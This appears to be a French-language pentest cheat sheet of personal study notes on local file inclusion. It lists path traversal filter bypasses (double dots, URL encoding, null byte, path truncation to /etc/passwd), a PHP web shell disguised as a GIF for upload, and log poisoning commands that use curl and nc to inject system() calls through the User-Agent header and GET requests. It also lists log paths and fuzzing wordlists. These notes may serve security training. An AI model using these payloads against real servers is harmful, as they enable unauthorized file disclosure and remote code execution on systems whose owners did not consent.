# Outrepasser les contremesures
Outrepasser les enlèvements de ../ non récursif

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#outrepasse les enlèvements de ../ non récursif
....//....//....//etc/passwd
#encodage URL
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
#double encodage
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Outrepasser une regex qui limite à un dossier

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#regex pour limited dans un certain dossier
./langue/../../../etc/passwd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Outrepasser les .truc forcés (Obselète)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#PHP ignore les / de fin, les . simples
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
#pré php 5.5. Terminer la string par un octect null
/etc/passwd%00
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Téléversement
Utiliser les fonctions de téléversement, cacher notre fichier dans un format accepté et l'inclure dans une page
ex: 
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
Si on peut voir l'image, regarder le code source pour le chemin

Log Poisoning
Ajouter du code dans un fichier que l'on contrôle, ex log puis essayer de le faire exécuter
Peut-être très gros! Reset la machine avant

| Emplacement | Distribution |
| --- | --- |
| **Apache** | Ne pourra peut-être pas être lu à cause des privilèges |
| /var/log/httpd/access_log	| 		RHEL / Red Hat / CentOS / Fedora| 
| /var/log/apache2/access.log	| 		Debian / Ubuntu Linux| 
| /var/log/httpd-access.log		| 		FreeBSD| 
| C:\xampp\apache\logs\access.log	| Windows| 
| **NGinx** | | 
| /var/log/nginx/ | Linux | 
| C:\nginx\log\ | Windows| 

modifier user-agent	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ajouter du code dans le GET
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc 192.168.60.216 80     
GET /<?php system($_GET['cmd']); ?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Peut aussi trouver le user-agent sur linux dans
* /proc/self/environ
* /proc/self/fd/[PID]

autres logs de services
* /var/log/sshd.log
* /var/log/mail
* /var/log/vsftpd.log

# Automatisation
Fuzzer, essayer de trouver des paramètres non exposés
seclist/Discovery/Web-Content/burp-parameter-names.txt
http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
		
fuzzer les valeurs de params pour LFI 
secLists/Fuzzing/LFI/LFI-Jhaddix.txt
		
Trouver la racine du serveur web, fuzzer vers index.php
secLists/Discovery/Web-Content/default-web-root-directory-linux.txt
secLists/Fuzzing/LFI/LFI-Jhaddix.txt
		
Trouver les fichiers de config du serveur, fuzzer
lfi/lfi-wordlist-linux
lfi/lfi-wordlist-windows
secLists/Fuzzing/LFI/LFI-Jhaddix.txt